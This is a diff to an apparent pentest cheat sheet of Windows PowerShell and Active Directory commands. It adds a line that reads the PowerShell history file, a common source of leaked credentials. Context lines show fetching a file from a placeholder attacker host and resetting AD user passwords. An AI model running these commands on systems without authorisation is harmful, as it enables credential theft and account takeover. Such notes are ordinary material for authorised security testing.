@@ -57,6 +57,7 @@ _______________________________ /\
 
 [CMD](WIN)*PS*   => Invoke-WebRequest -Uri "http://<ip>:<port>/<file>" -Outfile <outfile>
 [CMD](WIN)*PS*   => Expand-Archive <file.zip>
+[CMD](WIN)*PS*   => type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt (ou %userprofile% avec CMD)
 [CMD](AD)*PS*    => Set-ADAccountPassword <user> -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
 [CMD](AD)*PS*    => Set-ADUser -ChangePasswordAtLogon $true -Identity <user> -Verbose
 
